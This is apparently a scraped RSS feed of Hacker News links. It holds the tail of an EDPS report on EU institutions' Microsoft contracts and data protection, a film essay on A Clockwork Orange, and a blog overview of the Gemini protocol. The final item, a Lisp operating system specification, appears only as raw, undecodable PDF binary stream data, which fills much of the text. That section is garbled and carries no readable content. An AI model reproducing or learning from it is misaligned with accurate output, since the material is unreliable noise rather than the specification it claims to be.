<p>Fifth, the EU institutions had insufficient clarity as to the nature, scope and purposes of the processing and the risks to data subjects to be able to meet their transparency obligations towards data subjects. The EDPS recommended that EU institutions seek the clarity and assurances allowing them to keep data subjects properly informed.</p>
</div>
</header>
<nav id="TOC">

<ul>
<li><a href="#introduction"><span>1</span> Introduction</a>
<ul>
<li><a href="#context"><span>1.1</span> Context</a></li>
<li><a href="#general-recommendations"><span>1.2</span> General recommendations</a></li>
<li><a href="#the-inter-institutional-licence-agreement-ila"><span>1.3</span> The Inter-Institutional Licence Agreement (ILA)</a></li>
</ul></li>
<li><a href="#microsoft-as-controller"><span>2</span> Microsoft as controller</a>
<ul>
<li><a href="#right-of-unilateral-amendment"><span>2.1</span> Right of unilateral amendment</a></li>
<li><a href="#limited-data-protection-obligations"><span>2.2</span> Limited data protection obligations</a></li>
<li><a href="#insufficient-purpose-limitation"><span>2.3</span> Insufficient purpose limitation</a></li>
<li><a href="#consequences"><span>2.4</span> Consequences</a></li>
<li><a href="#recommendations"><span>2.5</span> Recommendations</a></li>
</ul></li>
<li><a href="#the-controller-processor-agreement"><span>3</span> The controller-processor agreement</a>
<ul>
<li><a href="#comprehensiveness-of-the-agreement"><span>3.1</span> Comprehensiveness of the agreement</a>
<ul>
<li><a href="#assessment"><span>3.1.1</span> Assessment</a></li>
<li><a href="#recommendations-1"><span>3.1.2</span> Recommendations</a></li>
</ul></li>
<li><a href="#sub-processors"><span>3.2</span> Sub-processors</a>
<ul>
<li><a href="#assessment-1"><span>3.2.1</span> Assessment</a></li>
<li><a href="#recommendations-2"><span>3.2.2</span> Recommendations</a></li>
</ul></li>
<li><a href="#audit-rights"><span>3.3</span> Audit rights</a>
<ul>
<li><a href="#assessment-2"><span>3.3.1</span> Assessment</a></li>
<li><a href="#recommendations-3"><span>3.3.2</span> Recommendations</a></li>
</ul></li>
</ul></li>
<li><a href="#data-location-transfers-and-disclosure"><span>4</span> Data location, transfers and disclosure</a>
<ul>
<li><a href="#data-location"><span>4.1</span> Data location</a></li>
<li><a href="#international-transfers"><span>4.2</span> International transfers</a></li>
<li><a href="#unauthorised-disclosure"><span>4.3</span> Unauthorised disclosure</a></li>
<li><a href="#consequences-1"><span>4.4</span> Consequences</a></li>
<li><a href="#recommendations-4"><span>4.5</span> Recommendations</a></li>
</ul></li>
<li><a href="#technical-measures"><span>5</span> Technical measures</a>
<ul>
<li><a href="#context-1"><span>5.1</span> Context</a></li>
<li><a href="#recommendations-5"><span>5.2</span> Recommendations</a></li>
</ul></li>
<li><a href="#transparency"><span>6</span> Transparency</a>
<ul>
<li><a href="#recommendations-6"><span>6.1</span> Recommendations</a></li>
</ul></li>
<li><a href="#conclusion"><span>7</span> Conclusion</a></li>
</ul>
</nav>

<h2 data-number="1.1" id="context"> Context</h2>
<p>This paper presents the issues raised by the EDPS’ own-initiative investigation into European institutions’, bodies’, offices’ and agencies’ (‘EU institutions’) use of Microsoft products and services. It presents the EDPS’ findings and recommendations from the investigation to be shared with a wider audience, applying a high standard of transparency<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a>, while preserving the necessary confidentiality of certain elements of the EU institutions’ contract and of the EDPS’ investigation.</p>
<p>A large amount of personal data is processed through the EU institutions’ use of Microsoft products and services. Over 45&nbsp;000 staff of EU institutions, including the EDPS, are users of those products and services. In addition, staff use Microsoft products and services to process the personal data of people who are not staff.</p>
<p>The EDPS’ investigation focused on the terms of the <em>Inter-Institutional Licensing Agreement</em> (‘ILA’) that EU institutions signed with Microsoft in 2018. The EDPS also considered the technical measures that the European Commission, as the largest EU institution with a great variety of tasks, had implemented affecting the flow of personal data to Microsoft.</p>
<p>The EDPS issued its findings and recommendations to the EU institutions upon the closure of its investigation in March 2020. The purpose of the EDPS’ report was to provide EU institutions with forward-looking assistance in bringing their arrangements into compliance with data protection law. In particular, the EDPS’ findings and recommendations were oriented towards supporting the renegotiation of the ILA and EU institutions’ contract and implementation of robust technical and organisational measures that should accompany the contract.</p>
<p>EU institutions’ processing of personal data and the EDPS’ own supervisory and investigative powers are governed by Regulation (EU) 2018/1725.<span data-cites="regulation20181725"><a href="#fn4" id="fnref4" role="doc-noteref"><sup>4</sup></a></span> The EDPS assessed the compliance of the ILA against the requirements laid down in that regulation. Although Regulation (EU) 2018/1725 is a data protection regime that is tailored to the EU institutions and distinct from the better-known General Data Protection Regulation<span data-cites="gdpr"><a href="#fn5" id="fnref5" role="doc-noteref"><sup>5</sup></a></span> (‘GDPR’), the overlap between the provisions of Regulation (EU) 2018/1725 and those of the GDPR is extensive.</p>
<p>As a consequence, the EDPS’ findings and recommendations are likely to be of wider interest than to EU institutions.<a href="#fn6" id="fnref6" role="doc-noteref"><sup>6</sup></a> Not only is the law the EDPS applied in its investigation based on the same principles and shares the vast majority of provisions with the GDPR, but the agreement signed by EU institutions is based on standard Microsoft volume-licensing documents and therefore likely to bear similarities to agreements concluded by other organisations. The EDPS’ findings and recommendations may be of particular interest to public authorities in EU member states.</p>
<p>They are also likely to be of relevance beyond the conclusion and implementation of volume licensing agreements for Microsoft products and services. In the EDPS’ view, organisations outsourcing provision or operation of digital services from other service providers are likely to come across similar issues.</p>
<h2 data-number="1.2" id="general-recommendations"> General recommendations</h2>
<p>The EDPS recommended that EU institutions carefully consider any purchases of Microsoft products and services or new uses of existing products and services until after they have analysed and implemented the recommendations of the EDPS. They should involve their Data Protection Officers when deciding how to implement the recommendations of the EDPS. The EU institutions should properly embed data protection in each specific public information and communications technology procurement procedure, specifying the security and data protection measures to be implemented in respect of the particular products and services that are being procured.</p>
<p>This will help EU institutions, from the start, to procure products and services with appropriate contractual and other organisational measures, technical and security measures so that the processing of personal data through those tools complies with Regulation (EU) 2018/1725, in particular with the principle of data protection by design and by default.<span data-cites="regulation20181725"><a href="#fn7" id="fnref7" role="doc-noteref"><sup>7</sup></a></span></p>
<h2 data-number="1.3" id="the-inter-institutional-licence-agreement-ila"> The Inter-Institutional Licence Agreement (ILA)</h2>
<p>The ILA that the EDPS examined had a complex structure with a multiplicity of interlocking documents …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://edps.europa.eu/sites/edp/files/publication/20-07-02_edps_euis_microsoft_contract_investigation_en.html">https://edps.europa.eu/sites/edp/files/publication/20-07-02_edps_euis_microsoft_contract_investigation_en.html</a></em></p>]]>
            </description>
            <link>https://edps.europa.eu/sites/edp/files/publication/20-07-02_edps_euis_microsoft_contract_investigation_en.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23730721</guid>
            <pubDate>Sat, 04 Jul 2020 07:17:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Clockwork Orange]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23730618">thread link</a>) | @Osiris30
<br/>
July 3, 2020 | https://theviewer.is/a-clockwork-orange/ | <a href="https://web.archive.org/web/*/https://theviewer.is/a-clockwork-orange/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

    

    <section>


            <p><em>This week's Viewer film essay: on Stanley Kubrick’s A Classic Orange. What kinds of writing would you like to see from the Viewer? All suggestions much appreciated. Let us know at <a href="mailto:editors@theviewer.is">editors@theviewer.is</a></em></p><hr><p><em>Spoilers Ahead (and for Taxi Driver, Parasite, and Barry Lyndon), and ultraviolence throughout.</em></p><p>Here is a typical character arc: the main character has a problem. They are living life in a self-perpetuating stasis, in need of change. An inciting event comes along to break that stasis, and they are forced to undergo a journey that spits them out as a better person.</p><p>This is a truncated version of Joseph Campbell’s cherished Monomyth, and most stories follow it in some way or other. I’ll call it the Change arc. Stanley Kubrick’s “A Clockwork Orange” follows a much less common pattern: the Repetition arc.</p><figure><img src="https://lh3.googleusercontent.com/HQv_8xSVpcFKDrzqDNxJgvsS8JPqIMbZnzabr8913uvu-NymSz4E-cPRN7WhQQXgmkiWHTf8WK9hP_scbHdyj9kuqw80Okk5XQnHyXF-1s_GDgZ3lpug_UyYSTvShHi2kJ3419hVaTGlRV2iLQ" alt=""></figure><p>The first two stages of the Repetition arc are identical to the Change arc. The hero of “A Clockwork Orange,” Alex DeLarge, is a young hooligan who wanders a futuristic Britain with his street gang the “droogs”, raping, assaulting and defacing everyone and everything that comes in their path. Here we certainly are presented with a problematic, self-perpetuating stasis. One night, during a break-in, Alex is arrested – our inciting event. Over the next few years in prison, he is institutionalized and put through an experimental indoctrination program known as the Ludovico technique, all in a bid to rehabilitate him. This portion of the film serves as his journey, his struggle to become better.</p><p>The treatment initially seems to work – it conditions Alex’s mind to react negatively to sex and violence. He is released back onto the streets. And yet the film doesn’t end with Alex having changed or become a better person – in the last scene, he finds he has lost his aversion to sex and violence and begins once again to experience vulgar sexual fantasies. “I was cured, all right!” he quips. He has returned to his first act stasis; after all his narrative trials and tribulations, nothing has really changed.</p><p>The Repetition arc has been used in many great films. “Taxi Driver” is the story of a disturbed loner who struggles to become better, ending up showered in public praise but just as disturbed as he always was. Bong Joon Ho’s recent critical darling “Parasite” is about a family that strives to be rich and never succeeds; a socio-economic twist on the Repetition arc. Kubrick himself would return to it with the underrated “Barry Lyndon,” the tale of an Irish rogue who tries to deceive his way into a fortune, but ends up alone, crippled and destitute, all of his ambitions having disintegrated.</p><p>The Repetition arc is essentially a pessimistic one. It tells the audience that things never change, that people live in hopeless cycles predetermined by their own characters and that their struggles to achieve moral betterment or success will inevitably collapse in on themselves. One might think that the Repetition arc would be narratively unsatisfying, because it fails to transport the audience. They don’t learn anything from the story. This isn’t the only kind of storytelling technique, though. If done right, symmetry and repetition can be just as narratively cathartic as growth. There is a powerful unity to a story that is bookended by identical scenes and sentiments, a sense of overarching stasis that is almost comforting in its nihilism.</p><p>We know that the Repetition arc is important to Stanley Kubrick’s film, because in the book upon which it is based, Alex <em>does </em>change. Anthony Burgess’ 1962 novel ends with Alex growing discontent with the criminal life and becoming a productive and happy member of society. Surprisingly, his original story is the Change arc incarnate. American publishers insisted on cutting the final chapter so the novel would end on a darker note, lopping off the Change and replacing it with Repetition. Burgess reluctantly agreed, although he called the American version “badly flawed.” When he was adapting the book for the screen, Kubrick opted for the American ending, going so far as to say that he never even considered including that final, redemptive chapter.</p><p>What does the Repetition arc signify in the story of “A Clockwork Orange”?</p><p>Well, both the Repetition and the Change arc start with a problem that the protagonist faces. Alex’s problem is that he is a bad person. He’s bad not because he is misguided, or depressed, or self-centered, or angry, or pretentious, or lazy – he’s simply <em>evil. </em>Burgess, Kubrick and McDowell crafted an amoral man, a man whose entire life is built around delighting in the pain of others. Early in the film, Alex and his droogs pass a homeless man who begs them for money. Cackling, they mercilessly beat him unconscious with their batons.</p><figure><img src="https://lh6.googleusercontent.com/XF63e4X5Q8XUOJm-0coaJNAcaptigvBj82O-Nw055wASuE10JyQgjITik5mxSXmh2SwyrGvfY6dYcaRePH4MweAS1tbw5FRlZxaiuYOUKNH910krDdci7hYShTRQJw9tjVzxrfa7rCDf58MrVA" alt=""></figure><p>The first act of the movie is almost entirely devoted to showing how bad Alex is. One might assume that Kubrick is trying, with these horrific scenes, to distance the audience from Alex, to cut off any possible empathy we might feel for him – but Kubrick said, “Alex symbolizes man in his natural state, the way he would be if society did not impose its ‘civilizing’ processes upon him. What we respond to subconsciously is Alex’s guiltless sense of freedom to kill and rape, and to be our savage natural selves, and it is in this glimpse of the true nature of man that the power of the story derives.” Kubrick wants us to experience Alex’s actions as evil, yes, but also as <em>free</em> – there is a kind of wild, barbaric joy in his ability to act badly and remain unpunished.</p><p>This freedom makes Alex’s eventual arrest and his tortuous imprisonment feel unbearably oppressive. The brand of re-education that he is subjected to is inherently futile – from the government’s perspective, it is a process of rehabilitating and morally improving a delinquent member of society. From our perspective, it is the equivalent of chaining a grizzly bear to a seat and trying to teach it advanced calculus. Although the “Ludovico technique” may subdue and sterilize Alex’s savage character, it can never make him good. Socrates emphasized in several Platonic dialogues that you cannot force someone else to have knowledge. Virtue is an intentional, personal state of the soul. The government has two choices; restrict Alex’s freedom, in which case he is little more than a robot, or let him exercise it, in which case he will leave a trail of destruction and cruelty in his wake.</p><p>The “journey” towards goodness that Alex experiences is a regression, rather than a progression. Thus, the second act of the Repetition arc is not the same as the second act of a Change arc – this journey is pointless from its inception. The Repetition arc mitigates the shock of its seemingly unresolved ending because the journey that fails to succeed was doomed from the very start. It is also important that Alex’s journey is not voluntary – it is quite literally forced upon him (a fact which is shockingly visualized in the infamous Ludovico scene). In this way, “A Clockwork Orange” is a variation on the traditional Repetition arc, replacing a failed personal struggle with a failed attempt at outward rehabilitation. It says that our personal efforts at development may be doomed, but prisons and indoctrination programs are no better.</p><figure><img src="https://lh6.googleusercontent.com/fpcF7mRsmJU56-vjE-73YSXZZSF_1fPFzNPZIp6dtD8ffp7Vkh397PZ7VlRkv2D_XlY6wVxkbJpVPkXOk2v9zfRLLtTG5ERWkkVH6vocGBqz3mXBzfDSMRCFUnIhrkRR0fL4iBVjA48rtt5Kig" alt=""></figure><p>Perhaps, then, the point of the Repetition arc in “A Clockwork Orange” is as simple as this; a bad man cannot be made good. Alex has a problem, a problem that is unacceptable in its natural state – for the writer whom Alex and his droogs cripple, or the writer's wife, whom they gang-rape, or the cat-lady Alex bludgeons in her own home – yet the Ludovico technique is just as hopeless. Alex’s rotten soul sits festering at the ideological center of the film, like a tumor for which scientists have no cure. Kubrick eschews Burgess’s more positive outlook, sending a message about human nature so cynical that the Repetition arc is the only acceptable mode of expression.</p><p>Back to that enigmatic ending. Alex sits in a hospital bed. The adoring press crowd around, snapping photos of him. The media is choosing to portray him as a victim of terrible state oppression – as we explore his sick imagination in those final moments, we recognize that this “victim” is not so innocent and never has been. The one thing that could have changed Alex would be a genuine attempt on his part to improve his soul, but from that opening shot of Alex staring malignantly into the camera, we know that he doesn’t have that in him. From the crooked timber of humanity, nothing can be made straight.</p><figure><img src="https://lh3.googleusercontent.com/vDLw5d872mwsvOypY0WP8HhIPAAR23gJf-Z7EmattuFHNJigIjaM-bVZPsJKdMFGsuZPaaA7vwb2rdgBEM5308qZe4J9P8vwdOwKLUcrW7yQW9tgsary_p2FuX2VvWZ7yo60N7G_RMikubyiLQ" alt=""></figure>


    </section>

    

</article></div>]]>
            </description>
            <link>https://theviewer.is/a-clockwork-orange/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23730618</guid>
            <pubDate>Sat, 04 Jul 2020 06:48:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A look at the Gemini protocol: a brutally simple alternative to the web]]>
            </title>
            <description>
<![CDATA[
Score 409 | Comments 331 (<a href="https://news.ycombinator.com/item?id=23730408">thread link</a>) | @flatlanderwoman
<br/>
July 3, 2020 | https://toffelblog.xyz/blog/gemini-overview/ | <a href="https://web.archive.org/web/*/https://toffelblog.xyz/blog/gemini-overview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article>

<p>Published on <b>2020-06-18</b></p>
<p>I have really come to hate the World Wide Web. It is bloated at every level! Websites themselves are doubling in size at an alarming rate. The web standards are expanding at an alarming rate. Trying to build a web browser that works with the modern web from scratch, would take the manpower equivalent to the Snowy Mountains Scheme or the Manhattan Project (no hyperbole).</p>
<p>The state of the web has lead me to only one conclusion: It is broken beyond repair.</p>
<p>I don't think the web can replaced, but we can still look for simpler (open standards) alternatives to move our works to. Gemini is one of these alternatives that I have taken interest in recently. A fairly recent protocol, created in 2019, Gemini defines a markdown-inspired document format, and it's own protocol to serve these documents, or other files.</p>
<p>If you a looking for a 1:1 clone for the early web, you will probably be disappointed. Gemini takes way more design hints from <a href="https://en.wikipedia.org/wiki/Gopher_(protocol)">Gopher</a> then it ever will from the web. Gopher (widely considered a predecessor to the web) is built on the idea of text only documents. Gemini expands on this idea by offering basic formatting, and fixing drawbacks unaccounted for in the original Gopher protocol.</p>
<p>Gemini shys away from many standard features of the web. Although there may be plenty of benefits that one accustomed to web wouldn't be able to identify. For example the lack of styling sheets may mean that Gemini sites look plain, however this allows your readers to decide on a colour scheme which suits them best. A night reader would prefer a dark theme, someone with a vision impairment will prefer high contrast, the list goes on.</p>
<p>Gemini offers no in-line image support no client-side scripting (such as Javascript). But server-side scripting (CGI) can work, so you could expect Gemini to be a valid interface for some online services.</p>
<p>The Gemini transport protocol is unsuitable for the transfer of large files, since it misses many features that protocols such as FTP or HTTP use to recover from network instability.</p>
<p>The internet protocols of old aren't encrypted by default, since security wasn't seen as being important back in the late-80's/early-90's. Thankfully Gemini, being a recent protocol, mandates the use of TLS. There is no unencrypted version of Gemini available.</p>
<p>I could totally see Gemini being used as an alternative particularly for the non-commercial individuals who use text as a primary medium. Blogs, poems, recipes, tutorials are perfect for the Gemini format. There are always ways around the lack of media functionality, since although Gemini lacks in-line images, you can still use in-line links to images. As time goes on I could imagine some Gemini browsers providing a fancy image viewer for links to images.</p>
<p>Now, what does Gemini currently have to offer? The best way to find out is to head over to the official site: <code>gemini.circumlunar.space</code> in your Gemini browser. Here you can find two search engines dedicated to finding pages based on what you search for. And two aggregators which acts as a news feed of Gemini posts.</p>
<p>Personally I enjoy scrolling through the aggregators and seeing what people are blogging about, I find interesting stuff frequently.</p>
<p>From a server management perspective, Gemini is just a diet-Web. You buy a domain name (using the web), obtain or rent a server, install a Gemini server, and start serving your site. In order to post to Gemini you either need to self-host, or take advantage of Gemini hosting which is currently on offer by circumlunar.space. No fancy P2P or Blockchain solution here, just a good old client/server model.</p>
<p>I will no doubt keep an eye on Gemini, and serving my blog posts to Gemini should be easy since they are already in markdown. No promises yet though.</p>
<p>I will leave you with the following quote and some interesting links I found.</p>
<blockquote>
<p>"When I picture it in my head I think of the early web as more of a library. Over time it has transitioned into a shopping mall." - chris_f (Hacker News comments)</p>
</blockquote>

<ul>
<li><a href="https://gemini.circumlunar.space/">(www) Project Gemini</a> - The official website for the Gemini project. FAQ is recommended reading. (<a href="https://news.ycombinator.com/item?id=23042424">hn thread</a>)</li>
<li><a href="gemini://gemini.circumlunar.space/">(gmi) Project Gemini</a> - The defacto Gemini main page.</li>
<li><a href="gemini://gemini.circumlunar.space/software/">(gmi) Gemini software</a> - The official page on Gemini lists out some clients and servers.</li>
<li><a href="gemini://gempaper.strangled.net/mirrorlist/">(gmi) List of services with a gemini mirror</a> - Includes Wikipedia, YouTube and Lobste.rs.</li>
</ul>

<ul>
<li><a href="https://portal.mozz.us/gemini/gemini.circumlunar.space/">portal.mozz.us</a> - A Gemini gateway for Web users.</li>
<li><a href="https://sr.ht/~julienxx/Castor/">Castor</a> - A browser for Gemini, Gopher and Finger. Written in Rust and GTK. Still early days, but probably the most normie friendly. (<a href="https://news.ycombinator.com/item?id=23161922">hn thread</a>)</li>
<li><a href="https://framagit.org/waweic/gemini-client">Android</a> - Barebones Android client.</li>
<li><a href="https://www.marmaladefoo.com/pages/geminaut">GemiNaut</a> - GUI client for Windows users.</li>
<li><a href="https://github.com/makeworld-the-better-one/md2gemini">md2gemini</a> - Python library that converts markdown to gemini.</li>
</ul>

<p><a href="https://news.ycombinator.com/item?id=23730408">Comments on Hacker News</a></p>
<p><a href="https://www.reddit.com/r/coding/comments/hl6qfv/a_look_at_the_gemini_protocol_a_brutally_simple/">Comments on reddit r/coding</a></p>

</article>

    </div></div>]]>
            </description>
            <link>https://toffelblog.xyz/blog/gemini-overview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23730408</guid>
            <pubDate>Sat, 04 Jul 2020 05:44:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Closos: Specification of a Lisp operating system (2013) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 21 (<a href="https://news.ycombinator.com/item?id=23730107">thread link</a>) | @ska80
<br/>
July 3, 2020 | http://metamodular.com/closos.pdf | <a href="https://web.archive.org/web/*/http://metamodular.com/closos.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>û¨&lt;“
endstream
endobj
20 0 obj
&lt;&lt;
/Length 662       
/Filter /FlateDecode
&gt;&gt;
stream
xÚåVMSÛ0½çWø(l´ú´Ž|=@§¸'Úƒ“ˆÄƒ±SÛaÊ¿ïÊ²ÓJÓ2Ó“eKZï{zoW,ZD,:�d“½Ð°Ä2Qv–¤ZGdb…ˆ²ytEŠ;ú5û°wÂíöJÁÒDp��úE‡çÙñyvé—NØðƒ½Û{âq£Ò°UÑØrFNófš/�E
dV—¥›uE]Ñ˜ƒ5)á&amp;d±›/è„ˆb‰’vˆ—���&amp;gå†tM�A™¯‡€B’ÐX1öÞÛdGWÈ‚Ð„S fw†=$ˆ}ôü¸&amp;î–�ËçÈŒ²Øœƒàã9Ô
�¥¶o¶"&lt;ý%f5BäÓ²žæe@·¶¡j-ßËy?þÈs£E¸L„Õ�,w¸t3ŠÐoVH�º¨(²ÒÕ
#Yj‰€çºNo\—ÑTŒÒZVÅ·õÀo�Ó¤jWEã¥Mý’û0&gt;þä_..114û¿gþšç@Å“¦ÒS=�êñçhÎÖFúz„¤—õ"n»KÔzÃÏ&amp;d9±½o;w‹[¹…×Ñ‘P/Ð‘	&nbsp;MÐÑ‘»+fCåž7Ø/0a×ød%€"òÙ"2ÿwé–¨Žß«ÌüTYÑ+ì†ò”¸®
*yÿÔÀK$+ÿDÖXô�Šö&amp;0ÔËÓSæå©Ì›�÷
†–ü¡¡U�X¥øŽ¡…ÁoCc8CÂ€+²¿
-ÁUst¶w2×À‰TÁÉ»¥�í6—}l&nbsp;Ü’Ïíx—ËÛ&gt;‚VÊùìkÜ¾¯F§äSñ'Võ}ÉÆ|8ËºŸ˜­o]åÏ´Ÿ¯}÷Ëü�¦ßc5#ÍZš—ÙƒbZõ¢ÉWK_Xï=•Iëc=dÿ¬š»ï¾MX©‰b;¿ŸÇÙäi€{
endstream
endobj
25 0 obj
&lt;&lt;
/Length 1006      
/Filter /FlateDecode
&gt;&gt;
stream
xÚ�VI¯ä4¾¿_‘£#ÑÁKœEœ1h0HÓ$†ƒ_âî¥ãVìL3ÿž*—“×óÔ#qr-®ª¯WÂ³sÆ³Ÿx:¿;&gt;}ýFÕ™äEUI�OYÛR¨Ls^´ZdÇ&gt;û‹}?˜k°K~Pºd"ÿûøXñL–EÝÔ­xvÐM¡DMoç\¶,,.?ÀÙ¯]ÝœìÚL”…*+™ìªª�M²…ÈBpÎþL€xUÅ5ûyôW¢žœÙÅ„q&gt;“ÌòÁ^È`ôIT™€$x»!TeÁyK‘¾Íe#’W¤ÞÁ)ë¯({Ÿ¼"ý�kŽ·ß½'þä$8ó@f.l	pI�@Äsv�ˆVŸ(²Á.Ä¸ÏÃpD*T¡Ë„tK­T’…X¤&nbsp;#hÙ0;û¤st&gt;“˜˜Û2†`gbÆt¦¤�Â¤ÌöV$ÎÃë`·&lt;ºuêD0tœ]º˜Mÿ(�0ÄºÊ²�@â¼�Nù¡ŽHD®„foòF1¬.^�Jq]JØù$q§í
©ž@tëR"|&lt;�ª·öÅÐÉÄLÞ%*�r©®ÿ£#ºÚŠ¤k¶zë7™%"”#á§ð&gt;æØqºB@?Ž‹›#èšR˜äa‘“›IA÷åòd:K/ckœ€ )¶Õât&nbsp;2¢V•ÆD–ôôæžDIW¥Ô¡¬ª._ÔÉo@·˜9Õ¦t»ˆÚ?ðùÅâ›JÊ‚ërß*ÕÊÔpÕŠ‡
/ù–Ý&gt;c½wÎ»K¢ÆÞšäÆ%Ç7Z: 1$Ø&amp;éËcÛ9ŠhÆ9åÿ¨h¤%‡²ûCB¦?p¥ì²O
O‹»eÿ}ÚwÀ½Ò(£ÊylŽnR�AŒ°°"tgíä€œŠYî†�pßç|ÿð•¬[¬	¶/¾°ÖË¦¨J½­u™Öúo‹{ž$ÍÂmÄÕƒûû.»}›§5®t&amp;|‹´|YãPîÝ3}2¤fÇ8¤µÆÖtöˆÁ-‡•¼•üÞ›(³hÁkôv]rxO.‡òuHYÿðSrØÌà3TÈí#ù‹‹^5ŒV:¶6êdð™ª=Å¸aIòº‰h»¥³X"z»¤)îI@s�Ôï¿¾ý“¨Û0nÍ�,ÒÆ?jëþUPœ–±&lt;½qˆ¶æw±Új
ÂÎ]®+,Ol\&gt;huYBƒ7¶ðQ¼í¢¹ÇP2˜žî:h'.Ÿîá¦éñ3M8s0°}¿`S"ã¯°Ø¾!:ìŸœÓ;
Ä%¶µñ#ç
lÁg¤&amp;KbwX=JpA&amp;«ûý…%)+vŒŸ§ÁMi¹ìý¯*�,dÙÀöªU¥IýìÊÇ§ÿ-¢|
endstream
endobj
31 0 obj
&lt;&lt;
/Length 2378      
/Filter /FlateDecode
&gt;&gt;
stream
xÚ�É’Û¸õî¯Ð‘ªiÑ$¸çæ8žÄ©ÏÔ”\•ªLh’XÃEC�îî|}ÞŠTÓv’Þ{Á·/vç]°ûë›?ß¼ý1LwaàAîŽ§]øyšîÒ0ö‹(Ú«Ý?=µÿ×ñïoTÅò&nbsp;
R_…p
yÿ·w¿?üº?D‘òBÈ²Èûøéøë^eÞÏùüþøñçOxÍ›@þ}ÿãƒ\xˆ?Kr¾v¼Ôvˆ“À»ýccÚÀ²è†Éå`ôØr¨?ñúùÓÇÞ´?„ž5c·Ïú®4×qý•f1£x%f^øq‘;9¯Ã&gt;	½~�w d¬å¯ÖÂDÊÏ²Â}„ê(2ï3Ñèálð#U)_eÙîF~|Z_¯M]ê±î;Pg{O{•{Ú
2ÔãhdÇö¼Ž=2TË
ÚÚŽ(8¢("}`¾àefÐ�ZÝ4f`t|tkAÉQ¦&lt;£K&lt;|!^ƒ5“t¡J¼§K-‡tÇ@íÖÑ2Ðã©'¡êªPs„Ø«.��º	¼ãÅX#ä™3uãL~ŠNÕOMÅ›eß¶H™KNf´CU¢ÕƒÈ{ÄS/_4"_ö¡W£‹tg&amp;÷�œ]Y!Xñ²7šçQ&nbsp;ž7ILú~¯ÓÈD;‚sÂZFOý Ww=8â°¥Öµí‹„~€+ÜT�ŽRˆ®#Å[3^`ä¨˜@V�•5’{S·ºŒô¦åãYkPö†¼¤ˆ· 
ó¥/_ë+ùý–×«rFêNêN¸Òâì1E˜¬¶æ�É@,¢%Cñª�mÏàB#–)·p¤D'©äèfü‰ŸÇ¯ØoênS„(ñ‹T-7Žrï�u?&nbsp;e$7ºWÂ£yÖíµq2€ZO† ±Å¡Ÿ‡áZpŽMq’*	Ðµ¸†iÁ¡\qŒ†œÂ@IË$
‘ÈÃhoèi¯šÊ=›n–ï™yòˆµ‘©ú»R9µ�^·ô· 	(F¢DÜ
Væ	€–åèÎl@aæ’uÊHRÉÕ´1�ÊØúÜ™
~ˆå$	gÇ‡Íù»Ì?»èj#òQà,w©‘B˜*Õ
Ö
`£†ÚbùJ(^Eþ‡KÿóÀÂÙAÆÇfË‹ÂÔ/n‡P´e|›§³é 1ß¸'È“ìEa—ªøµ9¾Î,8s^,\¿ü¯y�£y�Ã¯ˆp×¼"aìŒ�è·ùR�(Ô-&amp;ÍÝÿÆ&amp;ünXË~¬”TU(¿ÈÔZMì&nbsp;�;Gt±	ð~Qv.LÇ �›æÄßñ‡¬ð3°Šó‡¡?�6Scî‡yºÆ~ƒÄ„UùA"ýÖ‘ÙÅÐo¡šlo"ÈCRæaC‚&nbsp;[Ð´åD&nbsp;Pý€O‡©cB/kUW¼Åˆ)Xs¨ˆ˜xKwR0iMÛ/‡­¤ÐêNŸ
¥
ø;Ú$ÀÒ#*ð§Ÿ&gt;K #…äC@?ZNþˆ°5ù‘À7·FK~"””ò:ú¹Õû•R!g”úIò8‚{îÐ)xK˜Æ©y$gƒC˜lpëz!²Ô6”p
«nÌ|\É°]Å!´^.xº˜¯•î&nbsp;ÃÍbT¹Í`Üøî¬ o�JZ`Çq‘±[ ™|Ä4
¨?Ï!�îó“=±}3ËM}umçÿK¿�„®„ß›ÝHëj‹ùA%Þ2PÖu8Ïý$�Çû5³*ñ*TfÿÆë'èä±™ïƒæ"€ñ"I©xýÉÜ/ãöË¸r !T�’]£ÔÏâ»Në
dâÀÝÂ­“í¡ÍÁý¿µ·°m¯xX£§Ùy‡{c Tµå”Ô[Ý<puàî)•Î0à†ß]tâgØ"�ûá÷‡mŸrÕš›(ðÌéqv\@+uk6*ñÊÛ�àÊî�àxÿÙùÀ½¨d‡èj ]="" ¯?×snÁŸ¹ž¡nšÉr‹Ê-Åëxæ^¶ëªm="" ª�s·àaxtd¢ÄöÉç="" ,éÊ9o˜áË="" Ýx="">Ã©€r†[÷*BÊÍ—‚dN¯Ã0]a´ÚTwÛß²(XP�¡Nä-=OŠL‰*$H¢a44·:¾J;òM§è#Š=wÜA$ø»ÆV‚lp9‹¥@1M¯©^ ,"öŒ	£7ËÊ,i‰ÃÌûe6‡\7GœÜGß7”bŸ�&nbsp;�üZwç	2ü&amp;“vZö‰ÎßJñ�ø?e/1	°ëF|ò60/.©OŒƒþ^f—Gß¼]ÁeFœ&gt;å0„s�Ü;0bžM9ñ��¾Û}GŠgê¡yaŠ;üŽ²Õxß}½l&gt;[îP
®ùË
@›‡Ë8�‹ùm$vã/…uº�Å%µØüD‘¹±ù '‚Â�$?á)“Úƒ�®{5Á‚˜nNB~{ÈÜÛÉÚê
B3ñDÓèº{$Š¢»ž0J¡Æl]d®™
³o¾,1è
Š«~øîk51†¹gF*=j†`šŸ¤œ[Ü…mC™¬aÆ~Lö‚Qw»PŸ®ëf°ï}-ÙY4Bœ‘Í8gÆÈY'ÉŸpØï€LF�SJãqÊÏ-Ãd*Xùåc$žf”aNÄ,F"ÄØú¹X¤B¶ñ•¬«¶Üœº½&lt;]°�Ø-ˆ@/×¼ü›Þâr	`®z°Ž(»wGx…á¢–næÖèl„fã¸ßb�l±É¹´?Y™]Š{Qázì1‚ÔûD
